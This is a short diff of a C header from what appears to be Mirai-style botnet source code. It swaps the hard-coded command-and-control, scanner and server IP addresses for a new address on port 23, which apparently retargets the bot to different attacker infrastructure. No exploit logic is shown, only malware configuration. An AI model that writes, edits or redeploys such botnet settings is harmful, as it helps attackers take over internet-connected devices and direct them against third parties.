@@ -20,12 +20,12 @@ typedef uint16_t port_t;
 
 #define SINGLE_INSTANCE_PORT 23455
 
-#define FAKE_CNC_ADDR INET_ADDR(176,123,26,89)
+#define FAKE_CNC_ADDR INET_ADDR(5,181,80,48)
 #define FAKE_CNC_PORT 23
 /*                                                                 */
 #ifndef USEDOMAIN
-#define SCANIP (int)inet_addr((const char*)"173.232.146.173");
-#define SERVIP (int)inet_addr((const char*)"173.232.146.173");
+#define SCANIP (int)inet_addr((const char*)"5.181.80.48");
+#define SERVIP (int)inet_addr((const char*)"5.181.80.48");
 
 #else
 
